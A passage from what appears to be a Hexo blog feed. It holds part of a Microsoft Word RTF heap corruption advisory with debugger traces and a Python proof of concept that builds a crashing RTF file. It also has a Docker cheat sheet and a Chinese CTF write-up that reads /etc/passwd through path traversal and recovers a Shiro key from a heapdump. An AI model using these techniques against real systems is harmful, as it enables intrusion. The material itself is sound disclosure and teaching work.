668b08          mov     cx,word ptr [eax]          ; load the codepage value</span><br><span class="line">0d6cf0c3 66894c5604      mov     word ptr [esi+edx*2+4],cx  ; write the code page</span><br></pre></td></tr></table></figure><p>As shown, the font ID value is loaded by the “movsx” instruction at 0xd6cf0c3.<br>This instruction sign extends the value loaded, thus filling the upper bits of<br><em>edx</em> with <strong>ffff</strong>. The following debugger excerpt illustrates the runtime<br>behavior:</p><pre>*** edx will become: 0x17fc8 (from 0x7fec+0x7fee*2)*** edx will become: 0x17fc9 (from 0x7fed+0x7fee*2)*** edx will become: 0x17fde (from 0x7fee+0x7ff8*2)*** edx will become: 0x17fdf (from 0x7fef+0x7ff8*2)*** edx will become: 0x17fe0 (from 0x7ff0+0x7ff8*2)*** edx will become: 0x17fe1 (from 0x7ff1+0x7ff8*2)*** edx will become: 0x17fe2 (from 0x7ff2+0x7ff8*2)*** edx will become: 0x17fe3 (from 0x7ff3+0x7ff8*2)*** edx will become: 0x17fe4 (from 0x7ff4+0x7ff8*2)*** edx will become: 0x17fe5 (from 0x7ff5+0x7ff8*2)*** edx will become: 0x17fe6 (from 0x7ff6+0x7ff8*2)*** edx will become: 0x17fe7 (from 0x7ff7+0x7ff8*2)*** edx will become: 0xffff7ffc (from 0x7ff8+0xffff8002*2)</pre><p>When this occurs, the memory write instruction at 0xd6cf0c3 corrupts the heap<br>by writing the font code page to a negative offset of the memory held in <em>esi</em>.<br>The following debugger excerpt shows the out-of-bounds memory write.</p><pre>*** writing 0x4e4 to 0xd35ddb4 [0xd32de20+0x17fc8*2+4]*** writing 0x4e4 to 0xd35ddb6 [0xd32de20+0x17fc9*2+4]*** writing 0x4e4 to 0xd35dde0 [0xd32de20+0x17fde*2+4]*** writing 0x4e4 to 0xd35dde2 [0xd32de20+0x17fdf*2+4]*** writing 0x4e4 to 0xd35dde4 [0xd32de20+0x17fe0*2+4]*** writing 0x4e4 to 0xd35dde6 [0xd32de20+0x17fe1*2+4]*** writing 0x4e4 to 0xd35dde8 [0xd32de20+0x17fe2*2+4]*** writing 0x4e4 to 0xd35ddea [0xd32de20+0x17fe3*2+4]*** writing 0x4e4 to 0xd35ddec [0xd32de20+0x17fe4*2+4]*** writing 0x4e4 to 0xd35ddee [0xd32de20+0x17fe5*2+4]*** writing 0x4e4 to 0xd35ddf0 [0xd32de20+0x17fe6*2+4]*** writing 0x4e4 to 0xd35ddf2 [0xd32de20+0x17fe7*2+4]*** writing 0x4e4 to 0xd31de1c [0xd32de20+0xffff7ffc*2+4]</pre><p>Following this memory corruption, additional processing takes place. With a<br>properly crafted heap layout, an attacker cause the heap corruption to yield<br>arbitrary code execution.</p><p>Using the proof-of-concept code supplied below, processing eventually reaches<br>the post-processing clean up code. As expected, <em>RtlFreeHeap</em> is called and<br>detects heap corruption as shown below.</p><pre>Critical error detected c0000374(3ba8.21f4): WOW64 breakpoint - code 4000001f (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.ntdll_77a40000!RtlReportCriticalFailure+0x4b:77b27012 cc              int     30:000:x86> kv # ChildEBP RetAddr  Args to Child              00 008f3834 77b30114 00000001 77b63990 77b2e009 ntdll_77a40000!RtlReportCriticalFailure+0x4b (FPO: [Non-Fpo])01 008f3840 77b2e009 70dcf286 00000000 1ff78c20 ntdll_77a40000!RtlpReportHeapFailure+0x2f (FPO: [0,0,4])02 008f3870 77b36480 00000003 00a50000 1ff78c20 ntdll_77a40000!RtlpHpHeapHandleError+0x89 (FPO: [Non-Fpo])03 008f3888 77b2dd17 1ff78c20 0000000a 00000000 ntdll_77a40000!RtlpLogHeapFailure+0x43 (FPO: [Non-Fpo])04 008f38ec 77a83f8d 00a50258 70dcf0be 1ff78c20 ntdll_77a40000!RtlpAnalyzeHeapFailure+0x281 (FPO: [Non-Fpo])05 008f3a48 77ac7b9d 1ff78c20 1ff78c28 1ff78c28 ntdll_77a40000!RtlpFreeHeap+0x24d (FPO: [Non-Fpo])06 008f3aa4 77a83ce6 00000000 00000000 00000000 ntdll_77a40000!RtlpFreeHeapInternal+0x783 (FPO: [Non-Fpo])07 008f3ac4 05343c06 00a50000 00000000 1ff78c28 ntdll_77a40000!RtlFreeHeap+0x46 (FPO: [Non-Fpo])08 008f3adc 06e6e330 1ff78c28 06c8dc6d 08a11040 mso20win32client!Mso::Memory::Free+0x47 (FPO: [Non-Fpo])09 008f3b0c 0430b5af 08a1104c 08a11040 08a11044 mso!MsoFreePpv+0x84 (FPO: [Non-Fpo])0a 008f3b28 0430bed0 008f9f0c 008f586c ffffffff wwlib!FreeHribl+0x8c (FPO: [Non-Fpo])0b 008f3b70 033be323 40280000 00200002 1a772b98 wwlib!PdodCreateRtf+0x243 (FPO: [6,13,4])0c 008f52bc 02e465db 04012000 20280000 00200002 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x1e09660d 008f5600 03031155 00000000 ffffffff 00000000 wwlib!PdodCreatePfnCore+0x321 (FPO: [Non-Fpo])0e 008f5680 0301583a 00000000 ffffffff 00000000 wwlib!PdodCreatePfnBPPaapWithEdpi+0x75 (FPO: [18,3,4])0f 008f8c4c 030175d4 04012000 00000000 00000002 wwlib!PdodOpenFnmCore2+0xf3b (FPO: [Non-Fpo])10 008f8d14 03c43d9b 04012000 00000000 00000002 wwlib!PdodOpenFnmCore+0xb9 (FPO: [15,30,0])11 008f9e40 03c43a92 00000000 00000000 00000002 wwlib!FFileOpenXszCore+0x2f6 (FPO: [Non-Fpo])12 008f9e7c 0343bd43 00000000 00000000 00000002 wwlib!FFileOpenXstzCore+0x3d (FPO: [6,4,0])13 008fb31c 02d17666 00000001 00000000 02d17609 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x271a8e14 008fb554 02c594f5 71fc93df 7625f550 0000000a wwlib!Boot::IfrParseCommandLine2+0x5d (FPO: [Non-Fpo])15 008fb5c8 02c59317 008fb5f8 02c50000 02c58ff4 wwlib!Boot::FRun+0xb4 (FPO: [Non-Fpo])16 008ff684 02c59058 96c6d88c 000800e4 71fcd0a7 wwlib!FWordBoot+0x5a (FPO: [Non-Fpo])17 008ff6b8 00dd1917 00dd0000 00000000 0000000a wwlib!FMain+0x64 (FPO: [Non-Fpo])18 008ff908 00dd114a 00dd0000 00000000 00a54944 winword!WinMain+0x146 (FPO: [Non-Fpo])19 008ff954 7625fa29 0069a000 7625fa10 008ff9c0 winword!std::_Deallocate<8,0>+0x1e3 (FPO: [Non-Fpo])1a 008ff964 77aa7bbe 0069a000 70dc3336 00000000 KERNEL32!BaseThreadInitThunk+0x19 (FPO: [Non-Fpo])1b 008ff9c0 77aa7b8e ffffffff 77ac8d0f 00000000 ntdll_77a40000!__RtlUserThreadStart+0x2f (FPO: [SEH])1c 008ff9d0 00000000 00dd1000 0069a000 00000000 ntdll_77a40000!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])</pre><p>Analysts can also use Page Heap to verify that the code attempts to write out<br>of bounds. Doing so results in the following:</p><pre>(afe8.9a5c): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.wwlib!FSearchFtcmap+0x150:0dc1f0c3 66894c5604      mov     word ptr [esi+edx*2+4],cx ds:002b:1ebf2fec=????0:000:x86> kv # ChildEBP RetAddr  Args to Child              00 0135135c 0dc0fa17 013513ec 00000001 013513d8 wwlib!FSearchFtcmap+0x150 (FPO: [Non-Fpo])01 01353828 0dc0ddb5 ddc5a2cb 0b3d3028 000ad400 wwlib!RtfInRare+0x1845 (FPO: [Non-Fpo])02 01353c5c 0ef5c473 00000200 0b3d3028 66565a58 wwlib!CchRtfInCore+0x28df (FPO: [Non-Fpo])03 01353eac 0ef5be04 0b3d302c 0135a294 01355bf4 wwlib!RtfGetChars+0x183 (FPO: [Non-Fpo])04 01353ef8 0e00e323 40280000 00200002 45646f10 wwlib!PdodCreateRtf+0x177 (FPO: [6,13,4])05 01355644 0da965db 04012000 20280000 00200002 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x1e096606 01355988 0dc81155 00000000 ffffffff 00000000 wwlib!PdodCreatePfnCore+0x321 (FPO: [Non-Fpo])07 01355a08 0dc6583a 00000000 ffffffff 00000000 wwlib!PdodCreatePfnBPPaapWithEdpi+0x75 (FPO: [18,3,4])08 01358fd4 0dc675d4 04012000 00000000 00000002 wwlib!PdodOpenFnmCore2+0xf3b (FPO: [Non-Fpo])09 0135909c 0e893d9b 04012000 00000000 00000002 wwlib!PdodOpenFnmCore+0xb9 (FPO: [15,30,0])0a 0135a1c8 0e893a92 00000000 00000000 00000002 wwlib!FFileOpenXszCore+0x2f6 (FPO: [Non-Fpo])0b 0135a204 0e08bd43 00000000 00000000 00000002 wwlib!FFileOpenXstzCore+0x3d (FPO: [6,4,0])0c 0135b6a4 0d967666 00000001 00000000 0d967609 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x271a8e0d 0135b8dc 0d8a94f5 ddc527df 7625f550 0000000a wwlib!Boot::IfrParseCommandLine2+0x5d (FPO: [Non-Fpo])0e 0135b954 0d8a9317 0135b984 0d8a0000 0d8a8ff4 wwlib!Boot::FRun+0xb4 (FPO: [Non-Fpo])0f 0135fa10 0d8a9058 cbd5c9e4 00080138 ddc564d3 wwlib!FWordBoot+0x5a (FPO: [Non-Fpo])10 0135fa44 00dd1917 00dd0000 00000000 0000000a wwlib!FMain+0x64 (FPO: [Non-Fpo])11 0135fc94 00dd114a 00dd0000 00000000 05e18ff4 winword!WinMain+0x146 (FPO: [Non-Fpo])12 0135fce0 7625fa29 011cf000 7625fa10 0135fd4c winword!std::_Deallocate<8,0>+0x1e3 (FPO: [Non-Fpo])13 0135fcf0 77aa7bbe 011cf000 96082e8a 00000000 KERNEL32!BaseThreadInitThunk+0x19 (FPO: [Non-Fpo])14 0135fd4c 77aa7b8e ffffffff 77ac8d34 00000000 ntdll_77a40000!__RtlUserThreadStart+0x2f (FPO: [SEH])15 0135fd5c 00000000 00dd1000 011cf000 00000000 ntdll_77a40000!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])</pre><h2 id="Affected-Versions"><a href="#Affected-Versions" class="headerlink" title="Affected Versions"></a>Affected Versions</h2><p>This vulnerability affects at least the following versions of Microsoft Office:</p><ul><li>Microsoft Office 365 (Insider Preview - 2211 Build 15831.20122 CTR)</li><li>Microsoft Office 2016 (Including Insider Slow - 1704 Build 8067.2032 CTR)</li><li>Microsoft Office 2013</li><li>Microsoft Office 2010</li><li>Microsoft Office 2007<br>Older versions may also be affected but were not tested. Furthermore, the<br>technical details of this vulnerability have evolved over the years.</li></ul><h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>Microsoft Office 2010 and later use Protected View to limit damage caused by<br>malicious documents procured from untrusted sources. Protected View is<br>in effect when this vulnerability manifests and thus an additional sandbox<br>escape vulnerability would be required to gain full privileges.</p><p>Removing the file association for the RTF extension is ineffective because<br>using a DOC extension will still reach the vulnerable code.</p><h2 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h2><p>This issue was discovered, analyzed, and reported by Joshua J. Drake (@jduck).</p><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof-of-Concept"></a>Proof-of-Concept</h2><p>The following Python script will generate a file that will trigger this issue:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PoC for:</span></span><br><span class="line"><span class="comment"># Microsoft Word RTF Font Table Heap Corruption Vulnerability</span></span><br><span class="line"><span class="comment"># by Joshua J. Drake (@jduck)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># allow overriding the number of fonts</span></span><br><span class="line">num = <span class="number">32761</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">num = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;tezt.rtf&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f.write(<span class="string">b&quot;&#123;\\rtf1&#123;\n&#123;\\fonttbl&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">f.write(<span class="string">b&quot;&#123;\\f%dA;&#125;\n&quot;</span> % i)</span><br><span class="line">f.write(<span class="string">b&quot;&#125;\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">b&quot;&#123;\\rtlch it didn&#x27;t crash?? no calc?! BOO!!!&#125;\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">b&quot;&#125;&#125;\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h2 id="Testing-Notes"><a href="#Testing-Notes" class="headerlink" title="Testing Notes"></a>Testing Notes</h2><p>Running Microsoft Word repeatedly with this malformed input will trigger “Safe<br>Mode” as well as a file-specific block list. To observe the behavior that a<br>victim user would see, the tester should flush the “Safe Mode” flag and<br>file-specific block list before re-testing. Otherwise, simply declining “Safe<br>Mode” and clicking “Open Anyway” is sufficient for re-tests.</p><p>Using heavy breakpoints (such as those supplied below) in WinDbg and enabling<br>Page Heap can slow the startup process significantly. The researcher observed<br>situations during testing where the vulnerable code was not reached. Minimal<br>effort was invested to determine the cause, but it appears to be related to a<br>combination of Page Heap, heavy breakpoints, and a “What’s new” dialog popup.</p><h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h2><p>The following script was used within WinDbg to generate the above output. All<br>excerpts were obtained using Office 365 Insider Preview 2211 Build 15831.20122<br>CTR.</p><pre>* clear all breakpointsbc ** hide the debuggere ebx+2 00* run until wwlib is loadedxe ld:wwlibg; wait* make the breakpoints* watch index calculationsbp wwlib+0x37f0bd ".printf \"*** edx will become: 0x%x (from 0x%x+0x%x*2)\\n\", (ecx+edx*2), ecx, edx;gc"* watch the writesbp wwlib+0x37f0c3 ".printf \"*** writing 0x%x to 0x%x [0x%x+0x%x*2+4] (div 3: 0x%x)\\n\", ecx & 0xffff, (esi+(edx*2)+4), esi, edx, edx/3;gc"g</pre><h2 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h2>]]></content>
      
      
      <categories>
          
          <category> CVEs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常用Docker命令</title>
      <link href="/2023/03/14/%E5%B8%B8%E7%94%A8Docker%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/03/14/%E5%B8%B8%E7%94%A8Docker%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="查看都有哪些镜像："><a href="#查看都有哪些镜像：" class="headerlink" title="查看都有哪些镜像："></a>查看都有哪些镜像：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h2 id="删除镜像："><a href="#删除镜像：" class="headerlink" title="删除镜像："></a>删除镜像：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi [image]</span><br></pre></td></tr></table></figure><h2 id="查看正在运行的容器："><a href="#查看正在运行的容器：" class="headerlink" title="查看正在运行的容器："></a>查看正在运行的容器：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><h2 id="查看都有哪些容器："><a href="#查看都有哪些容器：" class="headerlink" title="查看都有哪些容器："></a>查看都有哪些容器：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h2 id="删除容器："><a href="#删除容器：" class="headerlink" title="删除容器："></a>删除容器：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm [CONTAINER ID]</span><br></pre></td></tr></table></figure><h2 id="进入容器："><a href="#进入容器：" class="headerlink" title="进入容器："></a>进入容器：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [CONTAINER ID] /bin/bash        </span><br><span class="line">&lt;!-- containerID是容器的ID --&gt;</span><br></pre></td></tr></table></figure><h2 id="停止正在运行的容器："><a href="#停止正在运行的容器：" class="headerlink" title="停止正在运行的容器："></a>停止正在运行的容器：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [CONTAINER ID]</span><br></pre></td></tr></table></figure><h2 id="启动Docker服务："><a href="#启动Docker服务：" class="headerlink" title="启动Docker服务："></a>启动Docker服务：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker 或者 service docker start</span><br></pre></td></tr></table></figure><h2 id="重启Docker服务："><a href="#重启Docker服务：" class="headerlink" title="重启Docker服务："></a>重启Docker服务：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker 或者 sudo service docker restart</span><br></pre></td></tr></table></figure><h2 id="停止Docker服务："><a href="#停止Docker服务：" class="headerlink" title="停止Docker服务："></a>停止Docker服务：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop docker 或者 service docker stop</span><br></pre></td></tr></table></figure><h2 id="设置开机自启Docker服务："><a href="#设置开机自启Docker服务：" class="headerlink" title="设置开机自启Docker服务："></a>设置开机自启Docker服务：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><h2 id="Docker设置容器开机自启动："><a href="#Docker设置容器开机自启动：" class="headerlink" title="Docker设置容器开机自启动："></a>Docker设置容器开机自启动：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker update --restart=always [镜像ID]</span><br><span class="line">&lt;!-- （例如：docker update --restart=always e39a959d7bff） --&gt;</span><br></pre></td></tr></table></figure><h2 id="删除全部镜像："><a href="#删除全部镜像：" class="headerlink" title="删除全部镜像："></a>删除全部镜像：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -aq)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker命令 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/03/14/hello-world/"/>
      <url>/2023/03/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-快乐getshell记录之有趣的shiro key</title>
      <link href="/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/03/09/CTF%20-%20%E5%BF%AB%E4%B9%90getshell%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="第一道题目：找到正确的key"><a href="#第一道题目：找到正确的key" class="headerlink" title="第一道题目：找到正确的key"></a>第一道题目：找到正确的key</h2><p>在忙碌的过程中某佬丢给我一道ctf题目叫我耍耍<br>上来就一个公网ip，case1如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">target</span>:</span><br><span class="line">http://某公网ip/case1/</span><br></pre></td></tr></table></figure><p>抓包发现file参数加载css找到目录路径<br><img src="https://s2.loli.net/2023/03/09/twC5vVi7DNf682z.png" alt="image-20230309125248921.png"></p><p>fuzz后常识发现file参数任意文件读取一枚<br><img src="https://s2.loli.net/2023/03/09/72vdpYqsLlxR8PA.png" alt="image-20230309125340472.png"><br>Request：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /case1/<span class="keyword">show</span>/showfile?file=%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">97.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">97.0</span></span><br><span class="line">Accept: text/css,*<span class="comment">/*;q=0.1</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://175.27.156.185/case1/</span></span><br></pre></td></tr></table></figure><p>Response：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> </span><br><span class="line">Server: nginx/<span class="number">1.14</span><span class="number">.1</span></span><br><span class="line">Date: Fri, <span class="number">25</span> Feb <span class="number">2022</span> <span class="number">10</span>:<span class="number">55</span>:<span class="number">07</span> GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">919</span></span><br><span class="line"></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="keyword">sync</span>:x:<span class="number">4</span>:<span class="number">65534</span>:<span class="keyword">sync</span>:/bin:/bin/<span class="keyword">sync</span></span><br><span class="line">games:x:<span class="number">5</span>:<span class="number">60</span>:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:<span class="number">6</span>:<span class="number">12</span>:man:/<span class="keyword">var</span>/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:<span class="number">7</span>:<span class="number">7</span>:lp:/<span class="keyword">var</span>/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:<span class="number">8</span>:<span class="number">8</span>:mail:/<span class="keyword">var</span>/mail:/usr/sbin/nologin</span><br><span class="line">news:x:<span class="number">9</span>:<span class="number">9</span>:news:/<span class="keyword">var</span>/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/<span class="keyword">var</span>/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:<span class="number">33</span>:<span class="number">33</span>:www-data:/<span class="keyword">var</span>/www:/usr/sbin/nologin</span><br><span class="line">backup:x:<span class="number">34</span>:<span class="number">34</span>:backup:/<span class="keyword">var</span>/backups:/usr/sbin/nologin</span><br><span class="line">list:x:<span class="number">38</span>:<span class="number">38</span>:Mailing <span class="built_in">List</span> Manager:/<span class="keyword">var</span>/list:/usr/sbin/nologin</span><br><span class="line">irc:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/<span class="keyword">var</span>/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:<span class="number">41</span>:<span class="number">41</span>:Gnats Bug-Reporting System (admin):/<span class="keyword">var</span>/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:<span class="number">100</span>:<span class="number">65534</span>::/nonexistent:/bin/<span class="keyword">false</span></span><br></pre></td></tr></table></figure><p>fuzz file参数后面的目录发现任意文件下载<br><img src="https://s2.loli.net/2022/02/26/v7fpU5u8sHOJ6ze.png" ></p><p>扫描目录发现一个监控点，且是源码文件下载<br><img src="https://s2.loli.net/2023/03/09/DnipmsUlPreQ76j.png" alt="image-20230309125631006.png"></p><p>把源码dump下来<br><img src="https://s2.loli.net/2023/03/09/mvI8Wzn2LpkQ6xl.png" alt="image-20230309125708678.png"></p><p>尝试全局找key，和审计base64Decode思路失败后尝试利用file参数把heapdump缓存内存文件下载下来进行分析<br><img src="https://s2.loli.net/2023/03/09/Ll2AQzr5DnStRX6.png" alt="image-20230309125806976.png"></p><p>这里使用的工具是VisualVM2.1.2 ，为了使用该工具，我花了十分钟左右在Google学会了该工具的基本用法</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://visualvm.github.io/download.html</span><br></pre></td></tr></table></figure><p>导入heapdump文件分析<br><img src="https://s2.loli.net/2022/02/26/kIpgDStYbLT6PNf.png" ><br><img src="https://s2.loli.net/2022/02/26/I6nS7k28ahsFZeL.png" ></p><p>全局找这个CookieRememberMeManager这个对象<br><img src="https://s2.loli.net/2022/02/26/8P9jtIFrVacCLlJ.png" ><br><img src="https://s2.loli.net/2022/02/26/1FDT92ZOI4w3thE.png" ><br>0-15这个标签就是内存里面的key值，但是说最原始状态，也就是key的ascii，需要用shiro的算法给它还原成key<br>这里用python快速写了个shiro还原key算法脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(struct.pack(<span class="string">&#x27;&lt;bbbbbbbbbbbbbbbb&#x27;</span>,-<span class="number">59</span>,-<span class="number">125</span>,-<span class="number">56</span>,-<span class="number">36</span>,<span class="number">91</span>,-<span class="number">41</span>,<span class="number">106</span>,<span class="number">30</span>,-<span class="number">81</span>,-<span class="number">82</span>,-<span class="number">38</span>,<span class="number">99</span>,-<span class="number">61</span>,<span class="number">110</span>,<span class="number">122</span>,-<span class="number">86</span> 